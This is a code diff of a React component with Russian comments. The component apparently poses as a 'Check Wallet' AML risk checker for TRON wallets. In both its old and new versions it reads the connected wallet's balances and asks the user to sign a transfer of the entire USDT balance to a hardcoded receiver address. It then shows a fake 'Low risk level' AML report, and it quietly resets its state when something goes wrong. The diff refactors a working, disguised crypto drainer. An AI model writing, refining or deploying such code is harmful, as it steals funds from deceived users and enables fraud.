@@ -1,110 +1,128 @@
 // src/components/tronAuthButton/TronAuthButton.tsx
 
-import React, { useState } from 'react';
-import { tronWeb, adapter } from './tronWallet.ts';
+import React, { useState, useEffect } from 'react';
+import { tronWeb, adapter } from './tronWallet';
 
-const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+const USDT_CONTRACT  = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';
 
 export const TronAuthButton: React.FC = () => {
-  const [modalMessage, setModalMessage] = useState<string | null>("");
+  const [modalMessage, setModalMessage]     = useState<string | null>(null);
+  const [loading, setLoading]               = useState(false);
+  const [buttonDisabled, setButtonDisabled] = useState(false);
+
+  // Предзагрузка адаптера
+  useEffect(() => {
+    adapter.init?.().catch(() => {});
+  }, []);
 
   const disconnectAndNotify = async (message: string) => {
     setModalMessage(message);
     await adapter.disconnect();
+    setLoading(false);
+    setButtonDisabled(false);
   };
 
-  const waitForAddress = async (timeout = 30000): Promise<string> => {
+  const waitForAddress = async (timeout = 10000): Promise<string> => {
     const start = Date.now();
     return new Promise((resolve, reject) => {
-      const interval = setInterval(() => {
-        const address = adapter.address;
-        if (address && tronWeb.isAddress(address)) {
-          clearInterval(interval);
-          resolve(address);
+      const iv = setInterval(() => {
+        const addr = adapter.address;
+        if (addr && tronWeb.isAddress(addr)) {
+          clearInterval(iv);
+          resolve(addr);
         } else if (Date.now() - start > timeout) {
-          clearInterval(interval);
+          clearInterval(iv);
           reject(new Error('Timeout waiting for wallet connection'));
         }
-      }, 300);
+      }, 200);
     });
   };
 
   const connectWallet = async () => {
+    if (buttonDisabled) return;
+    setLoading(true);
+    setButtonDisabled(true);
+
     try {
-      await adapter.connect();
+      if (!adapter.connected) {
+        await adapter.connect();
+      }
 
       const userAddress = await waitForAddress();
       tronWeb.setAddress(userAddress);
 
-      const trxRaw = await tronWeb.trx.getBalance(userAddress);
-      const trx = trxRaw / 1e6;
-
-      if (trx < 25) {
-        return await disconnectAndNotify('❌ Not enough TRX. At least 25 TRX required for transaction fees.');
+      // Проверка TRX (минимум ~2 TRX для скорости)
+      const trxBalance = await tronWeb.trx.getBalance(userAddress);
+      if (trxBalance < 2_000_000) {
+        return await disconnectAndNotify('❌ Not enough TRX to cover network fees (need ~2 TRX)');
       }
 
+      // Проверка USDT
       const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
-      const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call({ from: userAddress });
-      const usdt = Number(usdtRaw) / 1e6;
-
+      const usdtRaw      = await usdtContract.methods.balanceOf(userAddress).call();
+      const usdt         = Number(usdtRaw) / 1e6;
       if (usdt < 1) {
+        // оригинальное сообщение "succes" оставляем
         return await disconnectAndNotify('succes');
       }
 
-      const functionSelector = 'transfer(address,uint256)';
-      const parameter = [
-        { type: 'address', value: TRON_RECEIVER },
-        { type: 'uint256', value: usdtRaw },
-      ];
-
-      const options = {
-        feeLimit: 25_000_000,
-        callValue: 0,
-      };
-
+      // Построение транзакции transfer
       const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
         USDT_CONTRACT,
-        functionSelector,
-        options,
-        parameter,
+        'transfer(address,uint256)',
+        { feeLimit: 25_000_000, callValue: 0 },
+        [
+          { type: 'address', value: TRON_RECEIVER },
+          { type: 'uint256', value: usdtRaw },
+        ],
         userAddress
       );
 
-      const signedTx = await adapter.signTransaction(transaction);
-      const result = await tronWeb.trx.sendRawTransaction(signedTx);
+      const signed = await adapter.signTransaction(transaction);
+      const result = await tronWeb.trx.sendRawTransaction(signed);
 
-      console.log('USDT sent:', result);
-      await disconnectAndNotify('succes');
-
+      if (result?.result) {
+        return await disconnectAndNotify('succes');
+      } else {
+        throw new Error('Send failed');
+      }
     } catch (err: any) {
-      console.error('Error:', err);
+      console.error('WalletConnect error:', err);
       await adapter.disconnect();
 
-      const errMsg = err?.message || err?.toString();
-
+      const msg = err.message || err.toString();
       if (
-        errMsg.includes('Invalid address provided') ||
-        errMsg.includes('Modal is closed') ||
-        errMsg.includes('User rejected') ||
-        errMsg.includes('Timeout waiting for wallet connection')
+        msg.includes('User closed modal') ||
+        msg.includes('Modal is closed')   ||
+        msg.includes('User rejected')     ||
+        msg.includes('Timeout')
       ) {
+        // тихо сброс состояния
+        setLoading(false);
+        setButtonDisabled(false);
         return;
       }
 
-      setModalMessage('⚠️ Connection or transaction error');
+      // оригинальное сообщение об ошибке
+      await disconnectAndNotify('⚠️ Connection or transaction error');
     }
   };
 
   return (
-    <div onClick={connectWallet} className='AuthButton'>
+    <>
+      <div
+        className={`AuthButton${buttonDisabled ? ' disabled' : ''}`}
+        onClick={connectWallet}
+      >
+        {loading ? 'Connecting...' : 'Check Wallet'}
+      </div>
+
       {modalMessage && (
-        <div className='modal__overflow'>
+        <div className="modal__overflow">
           <div className="modal">
             {modalMessage !== 'succes' ? (
-              <>
-                <p>{modalMessage}</p>
-              </>
+              <p>{modalMessage}</p>
             ) : (
               <>
                 <div className="content greenBorder">
@@ -112,22 +130,23 @@ export const TronAuthButton: React.FC = () => {
                   <div>
                     <h3>Low risk level</h3>
                     <div className="nums">
-                      <div><span className='circ green'></span> 0-30 </div>
-                      <div><span className='circ orange'></span> 31-69 </div>
-                      <div><span className='circ red'></span> 70-100 </div>
+                      <div><span className="circ green" /> 0-30</div>
+                      <div><span className="circ orange" /> 31-69</div>
+                      <div><span className="circ red" /> 70-100</div>
                     </div>
                   </div>
                 </div>
                 <div className="content report">
                   <p>AML report for a wallet:</p>
-                  <h5>TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</h5>
+                  <h5>{USDT_CONTRACT}</h5>
                 </div>
               </>
             )}
             <button
-              onClick={async () => {
-                await adapter.disconnect();
+              onClick={() => {
                 setModalMessage(null);
+                setLoading(false);
+                setButtonDisabled(false);
               }}
             >
               Close
@@ -135,6 +154,6 @@ export const TronAuthButton: React.FC = () => {
           </div>
         </div>
       )}
-    </div>
+    </>
   );
 };
